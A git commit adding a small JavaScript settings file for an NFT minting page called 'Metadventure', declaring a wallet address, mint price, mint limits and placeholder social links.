34e1b57b0c1027e8cb2434f94db15a178c08d752
web3-utils <104205333+web3-utils@users.noreply.github.com>
2022-10-29 15:24:48 +0800

    Add files via upload

---
+++ setting.js
@@ -0,0 +1,12 @@
+
+let ADDRESS = "0x3E3679F097a79462c7F9A3256B32866BF3503848"
+const nftPrice = 0.025;
+const MAX = 5
+const namess = "Metadventure";
+const discord = "https://discord.gg/xxx";
+const twitter = "https://twitter.com/xxx";
+const startCounter = 12;
+const endCounter = 300;
+let price = 0.0;
+let totalPriceAmount = price;
+let countAmount = 1;
